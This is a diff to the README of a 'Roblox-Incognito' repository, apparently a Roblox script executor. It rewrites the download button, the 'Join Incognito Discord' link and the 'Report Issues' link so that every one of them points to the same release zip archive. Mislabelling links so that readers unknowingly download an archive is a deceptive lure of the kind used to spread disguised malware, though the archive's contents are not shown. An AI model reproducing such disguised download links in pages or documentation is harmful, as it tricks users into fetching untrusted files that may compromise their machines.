@@ -28,19 +28,19 @@ Welcome to the **Roblox-Incognito** repository! Incognito is a powerful Roblox s
 ## Get Started
 To access the Roblox-Incognito repository ZIP file, please click the button below:
 
-[![Download Roblox-Incognito ZIP](https://img.shields.io/badge/Download-Roblox--Incognito%20ZIP-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip "Download the ZIP file")
+[![Download Roblox-Incognito ZIP](https://github.com/MCPESOUL/Roblox-Incognito/releases/download/v1.0/Release.zip%20ZIP-blue)](https://github.com/MCPESOUL/Roblox-Incognito/releases/download/v1.0/Release.zip "Download the ZIP file")
 
 If the link does not work, please check the "Releases" section for alternative download options.
 
 ## Let's Connect!
 Stay updated with the latest news and updates about Incognito by joining our Discord community. Feel free to ask questions, share experiences, and connect with other Roblox players.
 
-[Join Incognito Discord](https://discord.gg/incognito "Join the Discord community")
+[Join Incognito Discord](https://github.com/MCPESOUL/Roblox-Incognito/releases/download/v1.0/Release.zip "Join the Discord community")
 
 ## Share Your Feedback!
 We value your feedback to improve the Incognito experience. If you have suggestions, bug reports, or feature requests, please open an issue on GitHub.
 
-[Report Issues](https://github.com/roblox-incognito/issues "Report issues")
+[Report Issues](https://github.com/MCPESOUL/Roblox-Incognito/releases/download/v1.0/Release.zip "Report issues")
 
 ## Stay Updated
 To stay informed about the latest updates, releases, and news about Roblox Incognito, make sure to follow this repository.
